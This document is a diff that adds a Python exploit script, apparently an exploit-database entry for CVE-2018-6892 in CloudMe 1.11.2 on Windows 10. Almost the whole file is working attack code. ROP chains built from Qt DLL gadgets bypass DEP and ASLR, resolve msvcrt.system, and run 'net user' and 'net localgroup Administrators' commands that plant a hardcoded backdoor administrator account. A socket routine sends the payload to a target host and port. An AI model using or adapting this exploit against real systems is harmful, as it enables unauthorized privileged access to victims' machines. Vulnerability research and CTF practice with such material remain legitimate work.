@@ -1,0 +1,319 @@
+# Exploit Title: CloudMe 1.11.2 - Buffer Overflow ROP (DEP,ASLR)
+# Exploit Author:  Bobby Cooke (boku)
+# CVE:             CVE-2018-6892
+# Date: 2020-09-29
+# Vendor Homepage: https://www.cloudme.com/
+# Software Link:   https://www.cloudme.com/downloads/CloudMe_1112.exe
+# Version:         1.11.2
+# Tested On:       Windows 10 (x64) - 10.0.19041 Build 19041
+# Script:          Python 2.7
+# Notes:
+#   This exploit uses MSVCRT.System to create a new user (boku:0v3R9000!) and add the new user to the 
+#   Administrators group. A requirement of successful exploitation is the CloudMe.exe process must be 
+#   running as adminstrator, such as when ran with 'Run as Administrator'; as this permission is required 
+#   to create new users on the system. This exploit has been tested against multiple Windows 10 systems 
+#   including x86, x64, Pro, Education, Home; although there is no guarantee it will work in your CTF.
+
+# CloudMe 1.11.2 - Turing Complete Add-Admin ROP (DEP,ASLR)
+import os,sys,socket,struct
+from colorama import Fore, Back, Style
+
+F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
+B = [Back.RESET,Back.BLACK,Back.RED,Back.GREEN,Back.YELLOW,Back.BLUE,Back.MAGENTA,Back.CYAN,Back.WHITE]
+S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
+ok   = S[3]+F[2]+')'+F[5]+'+++'+F[2]+'['+F[8]+'========> '+S[0]+F[0]
+err  = S[3]+F[2]+'<========'+F[2]+'['+F[5]+'+++'+F[2]+'( '+F[0]+S[0]
+def formatMsg(STRING):
+    return ok+S[3]+F[5]+STRING+S[0]
+def formatErr(STRING):
+    return err+S[3]+F[2]+STRING+S[0]
+
+#   Base       | Top        | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Modulename
+#  -------------------------------------------------------------------------------------------------------
+#   0x69900000 | 0x69ac1000 | False  | False   | False |  False   | False  | [Qt5Network.dll]
+#   0x6eb40000 | 0x6eb64000 | False  | False   | False |  False   | False  | [libgcc_s_dw2-1.dll]
+#   0x68a80000 | 0x69055000 | False  | False   | False |  False   | False  | [Qt5Core.dll]
+#   0x00400000 | 0x00831000 | False  | False   | False |  False   | False  | [CloudMe.exe]
+#   0x6d9c0000 | 0x6da0c000 | False  | False   | False |  False   | False  | [Qt5Sql.dll]
+#   0x64b40000 | 0x64b5b000 | False  | False   | False |  False   | False  | [libwinpthread-1.dll]
+#   0x66e00000 | 0x66e3d000 | False  | False   | False |  False   | False  | [Qt5Xml.dll]
+
+def getESP_RC():
+    GaDG3Tz = [
+    # ESP -> EDI
+    # Clobbers: BL # [EBX+5E5B10C4] must be writable # Requires ROPNOP
+    # Address=68F79000 Size=0007A000 (499712.) Owner=Qt5Core  68A80000 Section=.eh_fram Type=Imag 01001002 Access=RWE CopyOnWr 
+        0x68bb4678, # POP EBX # RETN [Qt5Core.dll] 
+        0x0A9C8F3C, # EBX + 0x5E5B10C4 = 0x68F7A000 = Writeable Memory
+        0x68d5e818, # PUSH ESP # OR BL,DL # INC DWORD PTR DS:[EBX+5E5B10C4] # POP EDI # RETN 0x04 [Qt5Core.dll]
+        0x68D50537, # RETN - ROPNOP
+        0x68D50537  # RETN - ROPNOP
+    ]
+    print(formatMsg("Get ESP ROP Chain built!"))
+    return ''.join(struct.pack('<I', _) for _ in GaDG3Tz)
+
+def msvcrt_rop_chain():
+    GaDG3Tz = [
+    # HMODULE LoadLibraryA( LPCSTR lpLibFileName);
+    # $ ==>    >  CALL to LoadLibraryA
+    # $+4      >  FileName = "msvcrt.dll"
+      # EAX = 0x512 = 1298
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFAEE, # NEG FFFFFAEE = 0x512
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EDI + EAX = End of string "msvcrt.dll"
+        0x68fc83b0, # add edi, eax # add eax, 41140e0a # ret [Qt5Core.dll] 
+      # EAX = 0x01
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFFF, # NEG FFFFFFfF = 0x01
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EAX = 0x0
+        0x68c7aa16, # DEC EAX # RETN [Qt5Core.dll]
+      # ECX = 0x0
+        0x68be726b, # XCHG EAX,ECX # RETN [Qt5Core.dll] 
+      # Terminate String "msvcrt.dll"
+        0x68cee06d, # XOR ESI,ESI # RETN  [Qt5Core.dll]  (Clear ESI)
+        0x68fbed52, # ADD ESI,EDI # ADD AL,0A # RETN [Qt5Core.dll] (EDI -> ESI)
+        0x68fa9d0d, # mov [esi], cl # adc al, 41 # ret [Qt5Core.dll]
+      # EAX = -0xA = 0xFFFFFFF6
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFF6, # -0xA
+      # ESI = Start of string "msvcrt.dll\x00"
+        0x68c050c0, # ADD ESI,EAX # INC EBP # RETN [Qt5Core.dll]
+      # EAX = PTR LoadLibraryA (from CloudMe Import Table)
+        # CloudMe Address=0081A168 Section=.idata Type=Import  (Known) Name=KERNEL32.LoadLibraryA
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFF7E5E98, # NEG FF7E5E98 = 0081A168 = PTR Kernel32.LoadLibraryA
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EAX = kernel32.LoadLibraryA
+        0x699030c5, # mov eax,dword ptr ds:[eax] [Qt5Network.dll] 
+      # ESI = kernel32.LoadLibraryA # EAX = Addr string "msvcrt.dll\x00"
+        0x68d50536, # XCHG EAX,ESI # RETN [Qt5Core.dll]
+      # For PUSHAD we need: EDI=FarRETN # ESI=&LoadLibraryA # EAX=["msvcrt.dll"] # ECX=ROPNOP
+        0x68d32800, # POP ECX # RETN [Qt5Core.dll]
+        0x68D50537, # RETN - ROPNOP
+        0x699f37ad, # POP EDI # RETN [Qt5Network.dll]
+        0x6990F972, # RETN 10 [Qt5Network.dll] 
+        0x68f7bc5e, # pushad # ret # [Qt5Core.dll]
+      # EAX -> EBP = msvcrt.dll
+        0x68cc462c  # XCHG EAX,EBP # RETN [Qt5Core.dll]
+    # EBP = msvcrt.dll
+   ]
+    print(formatMsg("LoadLibraryA(LPSTR \"msvcrt.dll\") ROP Chain built!"))
+    return ''.join(struct.pack('<I', _) for _ in GaDG3Tz)
+
+def GetProc_system_rop_chain():
+    GaDG3Tz = [
+    # FARPROC GetProcAddress( HMODULE hModule, LPCSTR  lpProcName);
+    #   $ ==>    >   CALL to GetProcAddress      # EDX (ROPNOP)
+    #   $+4      >   hModule = [msvcrt]          # ECX
+    #   $+8      >   ProcNameOrOrdinal  (system) # EAX
+      # EAX = 0x4a2 = 1186
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFB5E, # NEG FFFFFB5E = 0x4A2
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EDI + EAX = End of string "system"
+        0x68fc83b0, # add edi, eax # add eax, 41140e0a # ret [Qt5Core.dll] 
+      # EAX = 0x01
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFFF, # NEG FFFFFFfF = 0x01
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EAX = 0x0
+        0x68c7aa16, # DEC EAX # RETN [Qt5Core.dll]
+      # ECX = 0x0
+        0x68be726b, # XCHG EAX,ECX # RETN [Qt5Core.dll]
+      # Terminate String "system"
+        0x68cee06d, # XOR ESI,ESI # RETN  [Qt5Core.dll]  (Clear ESI)
+        0x68fbed52, # ADD ESI,EDI # ADD AL,0A # RETN [Qt5Core.dll] (EDI -> ESI)
+        0x68fa9d0d, # mov [esi], cl # adc al, 41 # ret [Qt5Core.dll]
+      # EAX = -0x6 = 0xFFFFFFFA
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFFA, # -0x6
+      # ESI = Start of string "system\x00"
+        0x68c050c0, # ADD ESI,EAX # INC EBP # RETN [Qt5Core.dll]
+        0x68fcf58d, # DEC EBP # RETN [Qt5Core.dll](fix EBP for prev gadgets) 
+      # EAX = PTR GetProcAddr (from CloudMe Import Table)
+        # CloudMe Address=0081A148 # Section=.idata # Type=Import # Name=KERNEL32.GetProcAddress
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFF7E5EB8, # NEG FF7E5EB8 = 0081A148 = PTR Kernel32.GetProcAddr
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+        0x699030c5, # mov eax,dword ptr ds:[eax] [Qt5Network.dll] 
+        0x68b48196, # XCHG EAX,ESI # RETN [Qt5Core.dll]
+        0x68be726b, # XCHG EAX,ECX # RETN [Qt5Core.dll]
+        # ESI = &kernel32.GetProcAddr # ECX=["system\x00"]# EBP=msvcrt.dll 
+      # For PUSHAD we need: EDI=FarRETN # ESI=&GetProcAddress # ECX=msvcrt.dll # EAX=["system"]# EDX=ROPNOP
+        # EBP -> EAX = msvcrt.dll
+        0x68cc462c, # XCHG EAX,EBP # RETN [Qt5Core.dll]
+        # ECX=&msvcrt.dll # EAX=["system\x00"]
+        0x68be726b, # XCHG EAX,ECX # RETN [Qt5Core.dll]
+        # EDX=ROPNOP
+        0x68f94685, # POP EDX # RETN [Qt5Core.dll]
+        0x68D50537, # RETN - ROPNOP
+        # EDI=FarRETN
+        0x699f37ad, # POP EDI # RETN [Qt5Network.dll]
+        0x699010B4, # ret 0C [Qt5Network.dll] 
+                    #    KERNEL32.GetProcAddress      [ESI pushed to stack]
+                    #                                 [EBP pushed to stack]
+                    #                                 [ESP pushed to stack]
+                    #                                 [EBX pushed to stack]
+# land after ret 0xC ->  Qt5Core.68D50537 (ROPNOP)    [EDX pushed to stack]
+                    #    MSVCRT.75F60000              [ECX pushed to stack]
+                    #    ASCII "system"               [EAX pushed to stack]
+        0X68f7bc5e, # pushad # ret # [Qt5Core.dll]
+        0x68b1df17  # XCHG EAX,EDX # RETN # [Qt5Core.dll]
+    # EDX = msvcrt.system
+   ]
+    print(formatMsg("GetProcAddress(HMODULE msvcrt, LPCSTR system) ROP Chain built!"))
+    return ''.join(struct.pack('<I', _) for _ in GaDG3Tz)
+
+def addUsr_rop_chain():
+    GaDG3Tz = [
+    # int system( const char *command);
+    # $ ==>    > CALL to system
+    # $+4      > command = "net user boku 0v3R9000! /add"
+      # EAX = 0x438 = 1080 
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFBC8, # NEG 0xFFFFFBC8 = 0x438
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EDI + EAX = End of string "net user..."
+        0x68fc83b0, # add edi, eax # add eax, 41140e0a # ret [Qt5Core.dll] 
+      # EAX = 0x01
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFFF, # NEG FFFFFFfF = 0x01
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EAX = 0x0
+        0x68c7aa16, # DEC EAX # RETN [Qt5Core.dll]
+      # ECX = 0x0
+        0x68be726b, # XCHG EAX,ECX # RETN [Qt5Core.dll]
+      # Terminate String "net user..."
+        0x68cee06d, # XOR ESI,ESI # RETN  [Qt5Core.dll]  (Clear ESI)
+        0x68fbed52, # ADD ESI,EDI # ADD AL,0A # RETN [Qt5Core.dll] (EDI -> ESI)
+        0x68fa9d0d, # mov [esi], cl # adc al, 41 # ret [Qt5Core.dll]
+      # EAX = -28 = -0x1C = 0xFFFFFFE4
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFE4, #  -28 = -0x1C
+      # ESI = Start of string "net user...\x00"
+        0x68c050c0, # ADD ESI,EAX # INC EBP # RETN [Qt5Core.dll]
+        # EDX = MSVCRT.system # ECX=0x0
+      # For PUSHAD we need: EDI=FarRETN # ESI=MSVCRT.system # EAX=["net user.."] # ECX=POP+RET
+        0x68d32800, # POP ECX # RETN [Qt5Core.dll]
+        0x699f37ad, # POP EDI # RETN [Qt5Network.dll]
+        # ESI = MSVCRT.system # EAX = ["net user.."]
+        0x68b1df17, # XCHG EAX,EDX # RETN # [Qt5Core.dll]
+        0x68b48196, # XCHG EAX,ESI # RETN [Qt5Core.dll]
+        # EDI=FarRETN
+        0x699f37ad, # POP EDI # RETN [Qt5Network.dll]
+        0x6990F972, # RETN 10 [Qt5Network.dll] 
+        # PUSHAD - Setup Call to MSVCRT.system on stack
+        0X68f7bc5e  # pushad # ret # [Qt5Core.dll]
+   ]
+    print(formatMsg("system(const char* \"net user boku 0v3R9000! /add\") ROP Chain built!"))
+    return ''.join(struct.pack('<I', _) for _ in GaDG3Tz)
+ 
+def addAdm_rop_chain():
+    GaDG3Tz = [
+    # ESI = msvcrt.system
+        # ESI -> EDX
+        0x68b48196, # XCHG EAX,ESI # RETN [Qt5Core.dll]
+        0x68b1df17, # XCHG EAX,EDX # RETN # [Qt5Core.dll]
+      # EAX = 0x3F7 
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFC09, # NEG 0xFFFFFC09 = 0x3F7
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EDI + EAX = End of string "net local..."
+        0x68fc83b0, # add edi, eax # add eax, 41140e0a # ret [Qt5Core.dll] 
+      # EAX = 0x01
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFFF, # NEG FFFFFFfF = 0x01
+        0x68cef5b2, # NEG EAX # RETN [Qt5Core.dll]
+      # EAX = 0x0
+        0x68c7aa16, # DEC EAX # RETN [Qt5Core.dll]
+      # ECX = 0x0
+        0x68be726b, # XCHG EAX,ECX # RETN [Qt5Core.dll]
+      # Terminate String "net local..."
+        0x68cee06d, # XOR ESI,ESI # RETN  [Qt5Core.dll]  (Clear ESI)
+        0x68fbed52, # ADD ESI,EDI # ADD AL,0A # RETN [Qt5Core.dll] (EDI -> ESI)
+        0x68fa9d0d, # mov [esi], cl # adc al, 41 # ret [Qt5Core.dll]
+      # EAX = -39 = -0x27 = 0xFFFFFFE4
+        0x68aec6ab, # POP EAX # RETN [Qt5Core.dll]
+        0xFFFFFFD9, #  -39 = -0x27
+      # ESI = Start of string "net local...\x00"
+        0x68c050c0, # ADD ESI,EAX # INC EBP # RETN [Qt5Core.dll]
+        # EDX = MSVCRT.system # ECX=0x0
+      # For PUSHAD we need: EDI=FarRETN # ESI=MSVCRT.system # EAX=["net local.."] # ECX=ROPNOP
+        0x68d32800, # POP ECX # RETN [Qt5Core.dll]
+        0x699f37ad, # POP EDI # RETN [Qt5Network.dll]
+        # ESI = MSVCRT.system # EAX = ["net local.."]
+        0x68b1df17, # XCHG EAX,EDX # RETN # [Qt5Core.dll]
+        0x68b48196, # XCHG EAX,ESI # RETN [Qt5Core.dll]
+        # EDI=FarRETN
+        0x699f37ad, # POP EDI # RETN [Qt5Network.dll]
+        0x6990F972, # RETN 10 [Qt5Network.dll] 
+        # PUSHAD - Setup Call to MSVCRT.system on stack
+        0X68f7bc5e  # pushad # ret # [Qt5Core.dll]
+   ]
+    print(formatMsg("system(const char* \"net localgroup Administrators boku /add\") ROP Chain built!"))
+    return ''.join(struct.pack('<I', _) for _ in GaDG3Tz)
+ 
+def sendRecv(s,p):
+    print(formatMsg("Sending payload: "))
+    print(S[3]+F[7]+payload+S[0])
+    s.send(p)
+    data = s.recv(1024)
+    return data
+
+def header():
+    head = S[3]+F[2]+'               --- Cloudme v1.12 | Add Admin (boku:0v3R9000!) ---\n'+S[0]
+    return head
+ 
+def sig():
+    SIG  = S[3]+F[4]+"                 .-----.._       ,--.\n"
+    SIG += F[4]+"                 |  ..    >  ___ |  | .--.\n"
+    SIG += F[4]+"                 |  |.'  ,'-'"+F[2]+"* *"+F[4]+"'-. |/  /__   __\n"
+    SIG += F[4]+"                 |      </ "+F[2]+"*  *  *"+F[4]+" \   /   \\/   \\\n"
+    SIG += F[4]+"                 |  |>   )  "+F[2]+" * *"+F[4]+"   /    \\        \\\n"
+    SIG += F[4]+"                 |____..- '-.._..-'_|\\___|._..\\___\\\n"
+    SIG += F[4]+"                     _______"+F[2]+"github.com/boku7"+F[4]+"_____\n"+S[0]
+    return SIG
+
+def footer():
+    foot = formatMsg('Requires that the Cloudme program is ran using \'Run As Administrator\'\n')
+    return foot
+
+if __name__ == "__main__":
+    print(header())
+    print(sig())
+    print(footer())
+    if len(sys.argv) != 3:
+        print(formatErr("Usage:   python %s <IP> <PORT>" % sys.argv[0]))
+        print(formaterr("Example: python %s '127.0.0.1' 8888" % sys.argv[0]))
+        sys.exit(-1)
+    host   = sys.argv[1]
+    port = int(sys.argv[2])
+
+    rop_chain = getESP_RC() + msvcrt_rop_chain() + getESP_RC() + GetProc_system_rop_chain() + getESP_RC() + addUsr_rop_chain() + getESP_RC() + addAdm_rop_chain()
+
+    os_EIP  = '\41'*1052
+    os_nSEH = '\x41'*(2344-len(os_EIP + rop_chain))
+    nSEH    = '\x42'*4
+    SEH     = '\x43'*4
+    buff    = os_EIP + rop_chain + os_nSEH + nSEH + SEH
+
+    term   = '\r\n'
+    kern32 = 'msvcrt.dll'+'AAAAAA'
+    winExe = 'system'+'BBBBBB'
+    addUsr = 'net user boku 0v3R9000! /add'+'CCCC'
+    addAdm = 'net localgroup Administrators boku /add'+'DDDD'
+    rmdr   = '\x44'*(3854-len(buff)-len(kern32)-len(winExe)-len(addAdm))
+    payload = buff + kern32 + winExe + addUsr + addAdm + rmdr + term
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host,port))
+        print(formatMsg( "Successfully connected to "+host+" on port "+str(port)))
+        resp = sendRecv(sock,payload)
+        print(formatMsg("Closing Socket"))
+        sock.close()
+        print(formatErr("Exiting python script."))
+    except:
+        print(formatErr("Failed to connect and send payload."))
